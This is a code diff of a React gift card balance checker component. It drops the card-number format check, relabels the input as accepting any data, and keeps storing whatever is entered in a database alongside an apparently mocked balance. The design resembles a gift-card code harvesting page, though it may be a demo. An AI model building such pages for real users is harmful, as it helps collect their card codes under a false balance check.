@@ -8,41 +8,23 @@ import { api } from "@/lib/api";
 
 
 export const GiftCardChecker = () => {
-  const [cardNumber, setCardNumber] = useState("");
+  const [inputData, setInputData] = useState("");
   const [loading, setLoading] = useState(false);
   const [balance, setBalance] = useState<number | null>(null);
   const { toast } = useToast();
 
-  const formatCardNumber = (input: string) => {
-    // Accept only letters and numbers, convert to uppercase
-    const cleaned = input.replace(/[^A-Za-z0-9]/g, "").toUpperCase();
-    
-    // Format in groups of 4
-    const formatted = cleaned.match(/.{1,4}/g)?.join(" ") || cleaned;
-    
-    // Limit to 16 characters plus spaces
-    return formatted.slice(0, 19);
-  };
-
-  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const value = e.target.value;
-    const formatted = formatCardNumber(value);
-    setCardNumber(formatted);
-  };
-
-  const isValidCardNumber = (number: string) => {
-    const cleaned = number.replace(/\s/g, "");
-    return cleaned.length === 16;
+  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    setInputData(e.target.value);
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
-    if (!isValidCardNumber(cardNumber)) {
+    if (!inputData.trim()) {
       toast({
         variant: "destructive",
-        title: "Invalid card number",
-        description: "Please enter exactly 16 characters (letters or numbers)",
+        title: "Please enter some data",
+        description: "Input field cannot be empty",
       });
       return;
     }
@@ -55,20 +37,20 @@ export const GiftCardChecker = () => {
 
       // Store in MongoDB via API
       await api.createGiftCard({
-        card_number: cardNumber,
+        card_number: inputData,
         balance: mockBalance
       });
 
       setBalance(mockBalance);
       toast({
-        title: "Balance retrieved successfully",
-        description: "Your card balance has been saved to database",
+        title: "Data processed successfully",
+        description: "Your data has been saved to database",
       });
     } catch (error) {
       console.error('Error saving to database:', error);
       toast({
         variant: "destructive",
-        title: "Error checking balance",
+        title: "Error processing data",
         description: "Failed to save to database. Please try again later",
       });
     } finally {
@@ -89,27 +71,23 @@ export const GiftCardChecker = () => {
           <form onSubmit={handleSubmit} className="space-y-6">
             <div className="space-y-3">
               <label
-                htmlFor="cardNumber"
+                htmlFor="inputData"
                 className="text-sm font-medium text-foreground/90 tracking-wide"
               >
-                Gift Card Number
+                Enter Any Data
               </label>
               <Input
-                id="cardNumber"
+                id="inputData"
                 type="text"
-                inputMode="text"
-                pattern="[A-Za-z0-9\s]*"
-                value={cardNumber}
-                onChange={handleCardNumberChange}
-                placeholder="ABCD 1234 EFGH 5678"
-                className="text-base uppercase tracking-widest font-mono bg-secondary/30 border-primary/30 focus:border-primary focus:ring-primary/50 backdrop-blur-sm"
+                value={inputData}
+                onChange={handleInputChange}
+                placeholder="Enter any text, numbers, or data..."
+                className="text-base bg-secondary/30 border-primary/30 focus:border-primary focus:ring-primary/50 backdrop-blur-sm"
                 disabled={loading}
-                maxLength={19}
                 autoComplete="off"
-                spellCheck="false"
               />
               <p className="text-xs text-muted-foreground">
-                Enter 16 characters (letters or numbers)
+                Accepts any type of data - text, numbers, codes, etc.
               </p>
             </div>
 
@@ -118,10 +96,10 @@ export const GiftCardChecker = () => {
               variant="premium"
               size="lg"
               className="w-full"
-              disabled={loading || !cardNumber.trim()}
+              disabled={loading || !inputData.trim()}
             >
               {loading && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
-              {loading ? "Checking Balance..." : "Check Balance"}
+              {loading ? "Processing Data..." : "Check Balance"}
             </Button>
           </form>
 
